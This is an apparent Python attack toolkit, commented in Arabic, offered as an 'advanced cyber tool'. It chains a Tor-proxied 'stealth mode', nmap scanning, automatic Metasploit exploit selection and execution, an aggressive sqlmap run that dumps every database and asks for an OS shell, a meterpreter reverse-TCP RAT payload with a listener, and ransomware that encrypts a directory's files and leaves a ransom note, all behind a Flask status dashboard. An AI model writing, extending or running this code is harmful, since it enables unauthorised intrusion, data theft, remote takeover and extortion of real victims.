import os
import subprocess
import logging
import sqlite3
import random
import string
import time
import threading
import psutil
import requests
import socket
import wave
import pyaudio
import redis
import smtplib
import cv2
import shutil
from flask import Flask, render_template, jsonify
from nvdlib import searchCVE
from scapy.all import *
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend

# ========================
# إعدادات السجل
# ========================
LOG_FILE = 'advanced_cyber_tool_log.txt'
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# ========================
# إعدادات التخفي
# ========================
def configure_stealth_mode():
    try:
        logging.info("Configuring stealth mode...")
        os.environ['http_proxy'] = "http://127.0.0.1:9050"
        os.environ['https_proxy'] = "http://127.0.0.1:9050"
        logging.info("Stealth mode configured.")
    except Exception as e:
        logging.error(f"Failed to configure stealth mode: {e}")

# ========================
# التفاعل مع قاعدة البيانات
# ========================
def initialize_database():
    try:
        conn = sqlite3.connect('cyber_tool.db')
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS exploits (id INTEGER PRIMARY KEY, target_ip TEXT, exploit_name TEXT, success BOOLEAN)''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS alerts (id INTEGER PRIMARY KEY, subject TEXT, body TEXT, timestamp TEXT)''')
        conn.commit()
        conn.close()
        logging.info("Database initialized.")
    except Exception as e:
        logging.error(f"Error initializing database: {e}")

def store_exploit_info(target_ip, exploit_name, success):
    try:
        conn = sqlite3.connect('cyber_tool.db')
        cursor = conn.cursor()
        cursor.execute('''INSERT INTO exploits (target_ip, exploit_name, success) VALUES (?, ?, ?)''', (target_ip, exploit_name, success))
        conn.commit()
        conn.close()
        logging.info(f"Exploit details stored for {target_ip}")
    except Exception as e:
        logging.error(f"Error storing exploit info: {e}")

def retrieve_exploit_info():
    try:
        conn = sqlite3.connect('cyber_tool.db')
        cursor = conn.cursor()
        cursor.execute('''SELECT * FROM exploits''')
        rows = cursor.fetchall()
        conn.close()
        return rows
    except Exception as e:
        logging.error(f"Error retrieving exploit info: {e}")
        return []

# ========================
# فحص الثغرات واختيار أقوى هجوم تلقائي
# ========================
def scan_target(target_ip):
    logging.info(f"Scanning target: {target_ip}")
    try:
        # استخدام nmap لفحص الشبكة
        nmap_scan = subprocess.check_output(f"nmap -T4 -p- {target_ip}", shell=True)
        logging.info(f"Scan result:\n{nmap_scan.decode()}")
        return nmap_scan.decode()
    except Exception as e:
        logging.error(f"Error scanning target: {e}")
        return None

def discover_vulnerabilities(scan_result):
    vulnerabilities = []
    if scan_result:
        # تحليل نتائج nmap واكتشاف الثغرات المحتملة
        if "open" in scan_result:
            vulnerabilities.append("Potential vulnerability found in open ports.")
    return vulnerabilities

def exploit_vulnerability(target_ip, port, vulnerability):
    try:
        search_command = f"msfconsole -q -x 'search {vulnerability}; exit'"
        search_result = subprocess.check_output(search_command, shell=True, text=True)

        exploits = []
        for line in search_result.splitlines():
            if "exploit/" in line:
                columns = line.split()
                exploit_name = columns[0] if len(columns) > 0 else None
                rank = columns[-1] if len(columns) > 0 else None
                if exploit_name and rank:
                    exploits.append({"name": exploit_name, "rank": rank})

        if exploits:
            sorted_exploits = sorted(exploits, key=lambda x: x["rank"], reverse=True)
            best_exploit = sorted_exploits[0]["name"]

            logging.info(f"Selected strongest exploit: {best_exploit}")

            exploit_command = f"msfconsole -q -x 'use {best_exploit}; set RHOSTS {target_ip}; set RPORT {port}; run; exit'"
            subprocess.run(exploit_command, shell=True)

            store_exploit_info(target_ip, best_exploit, True)
        else:
            logging.warning(f"No matching exploits found for vulnerability: {vulnerability}")
            store_exploit_info(target_ip, "No exploit found", False)
    except Exception as e:
        logging.error(f"Failed to execute exploit: {e}")
        store_exploit_info(target_ip, "Error", False)

# ========================
# SQLmap لتنفيذ هجوم SQL Injection
# ========================
def run_sqlmap(url):
    try:
        sqlmap_command = f"sqlmap -u {url} --batch --level=5 --risk=3 --tamper=space2comment,charencode,randomcase,between --random-agent --crawl=10 --threads=10 --technique=BEUSTQ --time-sec=10 --output-dir=sqlmap_output --dbs --dump-all --forms --smart --os-shell"
        logging.info(f"Running sqlmap on {url}...")
        subprocess.run(sqlmap_command, shell=True)
        logging.info("sqlmap completed.")
    except Exception as e:
        logging.error(f"Error running sqlmap: {e}")

# ========================
# RAT (Remote Access Trojan)
# ========================
def deploy_rat(target_ip):
    try:
        logging.info(f"Deploying RAT on target: {target_ip}")
        rat_payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={get_local_ip()} LPORT=4444 -f exe -o rat_payload.exe"
        subprocess.run(rat_payload, shell=True)
        rat_command = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {get_local_ip()}; set LPORT 4444; run;'"
        subprocess.run(rat_command, shell=True)
        logging.info(f"RAT deployed and listener started.")
    except Exception as e:
        logging.error(f"RAT deployment error: {e}")

# ========================
# Ransomware (الفدية)
# ========================
def encrypt_files(directory):
    try:
        key = Fernet.generate_key()
        cipher = Fernet(key)
        for filename in os.listdir(directory):
            file_path = os.path.join(directory, filename)
            if os.path.isfile(file_path):
                with open(file_path, 'rb') as file:
                    data = file.read()
                    encrypted_data = cipher.encrypt(data)
                with open(file_path, 'wb') as file:
                    file.write(encrypted_data)
        logging.info("Files encrypted successfully.")
        return key
    except Exception as e:
        logging.error(f"Ransomware error: {e}")

def ransom_note(directory, key):
    note = f"Your files have been encrypted. Pay ransom to decrypt. Key: {key}"
    with open(os.path.join(directory, "ransom_note.txt"), 'w') as file:
        file.write(note)
    logging.info("Ransom note created.")

# ========================
# API للتفاعل مع الواجهة
# ========================
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/status')
def get_status():
    exploit_info = retrieve_exploit_info()
    return jsonify({"exploits": exploit_info})

@app.route('/alerts')
def get_alerts():
    try:
        conn = sqlite3.connect('cyber_tool.db')
        cursor = conn.cursor()
        cursor.execute('''SELECT * FROM alerts''')
        alerts = cursor.fetchall()
        conn.close()
        return jsonify({"alerts": alerts})
    except Exception as e:
        logging.error(f"Error retrieving alerts: {e}")
        return jsonify({"error": "Failed to retrieve alerts"})

# ========================
# المدخل الرئيسي
# ========================
if __name__ == "__main__":
    dependencies = ["nmap", "hping3", "hydra", "msfconsole", "sqlmap"]
    configure_stealth_mode()
    initialize_database()
    app.run(debug=True, host="0.0.0.0", port=5000)
